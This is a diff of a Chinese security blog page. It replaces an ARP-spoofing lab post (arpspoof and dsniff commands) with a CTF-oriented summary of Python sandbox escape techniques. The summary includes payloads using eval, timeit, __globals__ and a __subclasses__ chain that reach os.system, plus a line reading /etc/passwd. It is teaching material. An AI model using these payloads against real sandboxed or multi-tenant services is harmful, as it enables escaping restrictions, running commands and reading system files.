@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="系统总结,">
+  <meta name="keywords" content="CTF,系统总结,">
 
 
 
@@ -86,23 +86,18 @@
 
 
 
-<meta name="description" content="arp协议简介arp是一种地址转换协议，在以太网中，网络设备之间相互通信是用Mac地址进行数据交流，而arp协议就是吧IP地址转换成Mac地址的 arp欺骗原理每台机器都会有一张arp缓存表，缓存表记录了ip地址与Mac地址的对应关系，在同一局域网中，A主机与B主机通信需要经过网关，但是arp缓存表存在一个缺陷，当主机收到arp应答包后，不会验证自己是否向对方主机发送过arp请求包，而是直接将返回">
-<meta name="keywords" content="系统总结">
+<meta name="description" content="在各个技术平台浏览了许多Python沙箱逃逸的问题，这里自己记录一下 Python 沙盒所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。 Python 沙箱逃逸的一些套路导入模块Python 的内建函数中，有一些函数可以帮助我们实现任意命令执行： os.system() os.popen() commands.getstatusoutput()">
+<meta name="keywords" content="CTF,系统总结">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ARP欺骗原理及实例">
-<meta property="og:url" content="https://yml-sec.top/2019/01/19/ARP欺骗原理及实例/index.html">
+<meta property="og:title" content="Python沙箱逃逸小结">
+<meta property="og:url" content="https://yml-sec.top/2019/02/12/Python沙箱逃逸小结/index.html">
 <meta property="og:site_name" content="yemoli&#39;s blog">
-<meta property="og:description" content="arp协议简介arp是一种地址转换协议，在以太网中，网络设备之间相互通信是用Mac地址进行数据交流，而arp协议就是吧IP地址转换成Mac地址的 arp欺骗原理每台机器都会有一张arp缓存表，缓存表记录了ip地址与Mac地址的对应关系，在同一局域网中，A主机与B主机通信需要经过网关，但是arp缓存表存在一个缺陷，当主机收到arp应答包后，不会验证自己是否向对方主机发送过arp请求包，而是直接将返回">
+<meta property="og:description" content="在各个技术平台浏览了许多Python沙箱逃逸的问题，这里自己记录一下 Python 沙盒所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。 Python 沙箱逃逸的一些套路导入模块Python 的内建函数中，有一些函数可以帮助我们实现任意命令执行： os.system() os.popen() commands.getstatusoutput()">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://i.imgur.com/NcOuF1y.jpg">
-<meta property="og:image" content="https://i.imgur.com/YMwTJXr.jpg">
-<meta property="og:image" content="https://i.imgur.com/Es74AWJ.jpg">
-<meta property="og:image" content="https://i.imgur.com/6lZ2OKf.jpg">
-<meta property="og:updated_time" content="2019-01-19T10:14:02.649Z">
+<meta property="og:updated_time" content="2019-02-12T14:31:15.392Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ARP欺骗原理及实例">
-<meta name="twitter:description" content="arp协议简介arp是一种地址转换协议，在以太网中，网络设备之间相互通信是用Mac地址进行数据交流，而arp协议就是吧IP地址转换成Mac地址的 arp欺骗原理每台机器都会有一张arp缓存表，缓存表记录了ip地址与Mac地址的对应关系，在同一局域网中，A主机与B主机通信需要经过网关，但是arp缓存表存在一个缺陷，当主机收到arp应答包后，不会验证自己是否向对方主机发送过arp请求包，而是直接将返回">
-<meta name="twitter:image" content="https://i.imgur.com/NcOuF1y.jpg">
+<meta name="twitter:title" content="Python沙箱逃逸小结">
+<meta name="twitter:description" content="在各个技术平台浏览了许多Python沙箱逃逸的问题，这里自己记录一下 Python 沙盒所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。 Python 沙箱逃逸的一些套路导入模块Python 的内建函数中，有一些函数可以帮助我们实现任意命令执行： os.system() os.popen() commands.getstatusoutput()">
 
 
 
@@ -132,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="https://yml-sec.top/2019/01/19/ARP欺骗原理及实例/">
+  <link rel="canonical" href="https://yml-sec.top/2019/02/12/Python沙箱逃逸小结/">
 
 
 
 
 
-  <title>ARP欺骗原理及实例 | yemoli's blog</title>
+  <title>Python沙箱逃逸小结 | yemoli's blog</title>
   
 
 
@@ -264,7 +259,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/01/19/ARP欺骗原理及实例/">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/02/12/Python沙箱逃逸小结/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="夜莫离、">
@@ -281,7 +276,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ARP欺骗原理及实例</h1>
+          <h1 class="post-title" itemprop="name headline">Python沙箱逃逸小结</h1>
         
 
         <div class="post-meta">
@@ -293,8 +288,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-19T17:11:37+08:00">
-                2019-01-19
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-12T21:36:36+08:00">
+                2019-02-12
               </time>
             
 
@@ -325,7 +320,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  365
+                  1.5k
                 </span>
               
 
@@ -341,7 +336,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  1
+                  7
                 </span>
               
             </div>
@@ -362,23 +357,82 @@
       
 
       
-        <h2 id="arp协议简介"><a href="#arp协议简介" class="headerlink" title="arp协议简介"></a>arp协议简介</h2><p>arp是一种地址转换协议，在以太网中，网络设备之间相互通信是用Mac地址进行数据交流，而arp协议就是吧IP地址转换成Mac地址的</p>
-<h2 id="arp欺骗原理"><a href="#arp欺骗原理" class="headerlink" title="arp欺骗原理"></a>arp欺骗原理</h2><p>每台机器都会有一张arp缓存表，缓存表记录了ip地址与Mac地址的对应关系，在同一局域网中，A主机与B主机通信需要经过网关，但是arp缓存表存在一个缺陷，当主机收到arp应答包后，不会验证自己是否向对方主机发送过arp请求包，而是直接将返回包中的ip和Mac地址对应的关系添加到arp缓存表中。</p>
-<h2 id="实例复现"><a href="#实例复现" class="headerlink" title="实例复现"></a>实例复现</h2><p>这里使用一台winxp和kali虚拟机</p>
-<p>ip分别是192.168.18.131,192.168.18.135</p>
-<p><img src="https://i.imgur.com/NcOuF1y.jpg" alt=""></p>
-<p><img src="https://i.imgur.com/YMwTJXr.jpg" alt=""></p>
-<p>这里我们为的是侦测到目标机的某些网络活动，所以在开始欺骗之前需要开启ip转发，不然在操作时目标主机会出现断网的情况</p>
-<pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
-</code></pre><p>kali下arp攻击工具是arpspoof，具体的命令可在百度上查询到或者使用arpspoof -h 查看口令</p>
-<p><img src="https://i.imgur.com/Es74AWJ.jpg" alt=""></p>
-<p>arpspoof -i eth0 -t 192.168.18.131 192.168.18.135</p>
-<p>开始修改目标机上的缓存表</p>
-<p><img src="https://i.imgur.com/6lZ2OKf.jpg" alt=""></p>
-<p>开始嗅探目标机上的网络活动</p>
-<p>dsniff -i eth0</p>
-<p>这就完成了一次arp欺骗攻击，我们就可以捕捉到目标机的网络活动了</p>
+        <p>在各个技术平台浏览了许多Python沙箱逃逸的问题，这里自己记录一下</p>
+<h1 id="Python-沙盒"><a href="#Python-沙盒" class="headerlink" title="Python 沙盒"></a>Python 沙盒</h1><p>所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。</p>
+<h1 id="Python-沙箱逃逸的一些套路"><a href="#Python-沙箱逃逸的一些套路" class="headerlink" title="Python 沙箱逃逸的一些套路"></a>Python 沙箱逃逸的一些套路</h1><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><p>Python 的内建函数中，有一些函数可以帮助我们实现任意命令执行：</p>
+<pre><code>os.system() os.popen()
+commands.getstatusoutput() commands.getoutput()
+commands.getstatus()
+subprocess.call(command, shell=True) subprocess.Popen(command, shell=True)
+pty.spawn()
+</code></pre><p>在 Python 中导入模块的方法通常有三种（xxx 为模块名称）：</p>
+<pre><code>import xxx
+from xxx import *
+__import__(&apos;xxx&apos;)
+</code></pre><p>我们可以通过上述的导入方法，导入相关模块并使用上述的函数实现命令执行。 除此之外，我们也可以通过路径引入模块： 如在 linux 系统中 Python 的 os 模块的路径一般都是在 /usr/lib/python2.7/os.py，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数。</p>
+<pre><code>&gt;&gt;&gt; import sys
+&gt;&gt;&gt; sys.modules[&apos;os&apos;]=&apos;/usr/lib/python2.7/os.py&apos;
+&gt;&gt;&gt; import os
+&gt;&gt;&gt;
+</code></pre><p>其他的危险函数举例 如 execfile 文件执行</p>
+<pre><code>&gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;)
+&gt;&gt;&gt; system(&apos;cat /etc/passwd&apos;)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+...
+&gt;&gt;&gt; getcwd()
+&apos;/usr/lib/python2.7&apos;
+</code></pre><p>timeit</p>
+<pre><code>import timeit
+timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1)
+</code></pre><p>exec 和 eval</p>
+<pre><code>eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)
+</code></pre><p>platform</p>
+<pre><code>import platform
+print platform.popen(&apos;dir&apos;).read()
+</code></pre><p>正常的 Python 沙箱会以黑名单的形式禁止使用一些模块如 os 或以白名单的形式只允许用户使用沙箱提供的模块，用以阻止用户的危险操作。下面讨论一下这种情况下应该如何进行绕过</p>
+<h2 id="Python-的内建函数"><a href="#Python-的内建函数" class="headerlink" title="Python 的内建函数"></a>Python 的内建函数</h2><pre><code>&gt;&gt;&gt; dir(__builtins__)
+[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;ZeroDivisionError&apos;, &apos;_&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]
+</code></pre><p>通过该命令我们可以获取内置函数的列表</p>
+<h2 id="禁用import的绕过"><a href="#禁用import的绕过" class="headerlink" title="禁用import的绕过"></a>禁用import的绕过</h2><p>在Python里，这段[].<strong>class</strong>.<strong>mro</strong>[-1].<strong>subclasses</strong>()魔术代码，不用import任何模块，但可调用任意模块的方法。</p>
+<p>查看Python版本</p>
+<pre><code>Python2.x和Python3.x有一些区别，Bypass前最好知道Python版本。
 
+我们知道，sys.version可以查看python版本。
+
+&gt;&gt;&gt; import sys
+&gt;&gt;&gt; sys.version
+</code></pre><h2 id="globals"><a href="#globals" class="headerlink" title="globals"></a><strong>globals</strong></h2><p>该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os,sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用<strong>globals</strong>　属性访问全局的变量</p>
+<pre><code>&gt;&gt;&gt; a = lambda x:x+1
+&gt;&gt;&gt; dir(a)
+[&apos;__call__&apos;, &apos;__class__&apos;, &apos;__closure__&apos;, &apos;__code__&apos;, &apos;__defaults__&apos;, &apos;__delattr__&apos;, &apos;__dict__&apos;, &apos;__doc__&apos;, &apos;__format__&apos;, &apos;__get__&apos;, &apos;__getattribute__&apos;, &apos;__globals__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__module__&apos;, &apos;__name__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;func_closure&apos;, &apos;func_code&apos;, &apos;func_defaults&apos;, &apos;func_dict&apos;, &apos;func_doc&apos;, &apos;func_globals&apos;, &apos;func_name&apos;]
+&gt;&gt;&gt; a.__globals__
+{&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;a&apos;: &lt;function &lt;lambda&gt; at 0x7fcd7601ccf8&gt;, &apos;__package__&apos;: None}
+&gt;&gt;&gt; a.func_globals
+{&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;a&apos;: &lt;function &lt;lambda&gt; at 0x7f1095d72cf8&gt;, &apos;__package__&apos;: None}
+(lambda x:1).__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).system(&apos;ls&apos;)&quot;)
+</code></pre><p>_globals__ 是一个字典，默认有<strong>builtins</strong>对象，在python sandbox中一般会过滤<strong>builtins</strong>内容，这样globals里面的<strong>builtins</strong>也就没有什么意义了,即使重新import <strong>builtin</strong> 还是一样.</p>
+<h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><p>在python2.7.10里，<br>[].class.base.subclasses() 里面有很多库调用了我们需要的模块os</p>
+<pre><code>/usr/lib/python2.7/warning.py
+58  &lt;class &apos;warnings.WarningMessage&apos;&gt;
+59  &lt;class &apos;warnings.catch_warnings&apos;&gt;
+
+/usr/lib/python2.7/site.py
+71  &lt;class &apos;site._Printer&apos;&gt;
+72  &lt;class &apos;site._Helper&apos;&gt;
+76  &lt;class &apos;site.Quitter&apos;&gt;
+</code></pre><p>我们来看一下/usr/lib/python2.7/warning.py导入的模块</p>
+<pre><code>import linecache
+import sys
+import types
+</code></pre><p>跟踪linecache文件/usr/lib/python2.7/linecache.py</p>
+<p>import sys<br>import os</p>
+<p>于是一个利用链就可以构造了:</p>
+<pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;ls&apos;)
+[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].system(&apos;ls&apos;)
+</code></pre>
       
     </div>
     
@@ -424,7 +478,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/系统总结/" rel="tag"># 系统总结</a>
+            <a href="/tags/CTF-系统总结/" rel="tag"># CTF,系统总结</a>
           
         </div>
       
@@ -437,8 +491,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/18/无数字和字母的webshell/" rel="next" title="无数字和字母的webshell">
-                <i class="fa fa-chevron-left"></i> 无数字和字母的webshell
+              <a href="/2019/02/11/置顶-项目发布-莫离新版授权系统/" rel="next" title="置顶-项目发布-莫离新版授权系统">
+                <i class="fa fa-chevron-left"></i> 置顶-项目发布-莫离新版授权系统
               </a>
             
           </div>
@@ -446,10 +500,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/20/flask-debug模式下pin码安全/" rel="prev" title="flask debug模式下pin码安全">
-                flask debug模式下pin码安全 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -596,7 +646,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#arp协议简介"><span class="nav-number">1.</span> <span class="nav-text">arp协议简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#arp欺骗原理"><span class="nav-number">2.</span> <span class="nav-text">arp欺骗原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实例复现"><span class="nav-number">3.</span> <span class="nav-text">实例复现</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Python-沙盒"><span class="nav-number">1.</span> <span class="nav-text">Python 沙盒</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Python-沙箱逃逸的一些套路"><span class="nav-number">2.</span> <span class="nav-text">Python 沙箱逃逸的一些套路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#导入模块"><span class="nav-number">2.1.</span> <span class="nav-text">导入模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python-的内建函数"><span class="nav-number">2.2.</span> <span class="nav-text">Python 的内建函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#禁用import的绕过"><span class="nav-number">2.3.</span> <span class="nav-text">禁用import的绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#globals"><span class="nav-number">2.4.</span> <span class="nav-text">globals</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#执行系统命令"><span class="nav-number">2.5.</span> <span class="nav-text">执行系统命令</span></a></li></ol></li></ol></div>
             
 
           </div>
